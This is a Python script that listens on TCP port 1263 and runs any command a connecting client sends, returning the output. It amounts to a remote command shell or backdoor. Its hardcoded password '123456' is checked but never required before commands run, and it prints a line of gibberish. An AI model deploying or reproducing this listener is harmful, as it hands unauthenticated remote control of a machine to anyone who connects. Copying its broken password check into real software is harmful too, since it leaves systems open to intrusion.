import socket
import subprocess
password = "123456"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((socket.gethostname(), 1263))
s.listen(10)
while True:
    conn, address = s.accept()
    
    while True:
        print(f'Get connection from {address}')
        data = conn.recv(2048).decode('utf-8')
        print(data)
        if (data[:8] == "password"):
            if (data[8:] == password):
                print("asdhfjksadhfjksadhfsjk kldsjfksahfdkjshfd ")
                conn.send("Successful".encode('utf-8'))
            else:
                conn.send("Fail".encode('utf-8'))
        else:
            if len(data) <= 0:
                break
            print(data)
            try:
                conn.settimeout(5)
                data = subprocess.run(data.split(), capture_output= True).stdout.decode()
            except:
                data = "No such command"
            conn.send(data.encode('utf-8')) 
    conn.close()   